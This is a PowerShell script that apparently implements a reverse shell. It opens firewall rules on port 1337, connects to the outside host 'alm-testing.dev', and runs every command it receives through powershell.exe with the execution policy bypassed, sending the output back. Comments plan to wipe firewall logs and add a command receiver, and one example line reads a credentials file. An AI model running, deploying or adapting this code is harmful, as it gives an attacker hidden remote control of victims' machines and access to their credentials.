if (!$(Get-NetFirewallRule -DisplayName "rs1in" 2>$null)) {
	New-NetFirewallRule -DisplayName "rs1in" -Direction Inbound -LocalPort 1337 -Protocol TCP -Action Allow
} 

if (!$(Get-NetFirewallRule -DisplayName "rs1out" 2>$null)) {
	New-NetFirewallRule -DisplayName "rs1out" -Direction Outbound -LocalPort 1337 -Protocol TCP -Action Allow
} 



#TODO: Add firewall log wipes during killed connection.
#TODO: Add rpc reciever to execute received commands.



#Format for executing commands with powershell and storing the results
#$thing = powershell.exe -command "type time-sheet-creds.txt"


try {
	$client = New-Object System.Net.Sockets.TCPClient("alm-testing.dev", 1337);
	$client.ReceiveTimeout = 5000;
	$stream = $client.GetStream();
	$writer = New-Object System.IO.StreamWriter($stream);
	$reader = New-Object System.IO.StreamReader($stream);
	$writer.WriteLine("startup");
	$writer.Flush();
	$cmd_buff = [char[]]::new(1024)
	$exit = 0;
	$reading = $false
	while ($exit -eq 0) {
		if($client.Client.Poll(5000000,[System.Net.Sockets.SelectMode]::SelectRead) -eq $true) {
			if ($client.Client.Available -eq 0) {
				Write-Output "Connection to server lost";
				$exit = 1;
			} else {
				$client_stream = $client.GetStream();
				$client_reader = New-Object System.IO.StreamReader($client_stream);
				$client_writer = New-Object System.IO.StreamWriter($client_stream);
				

				while ($client_reader.Peek() -ge 0) {		
					$cmd_buff = $client_reader.ReadLine();
					$launch = $cmd_buff -join ""

					if ($launch -ne "client established") {
						if ($launch -match "^cd (.*)") {
							cd $Matches[1];
							$client_writer.WriteLine(" ");
						} else {
							
							foreach ($line in (powershell.exe -ExecutionPolicy Bypass -command $launch | Out-String -Stream) ) {
								Write-Output $line;
								$client_writer.WriteLine($line);							
							}
							
						}	
						$client_writer.WriteLine(" ");
						$client_writer.Flush();
					}
				}
			}				
		} 
	}
}
catch {
	Write-Output $_;
}

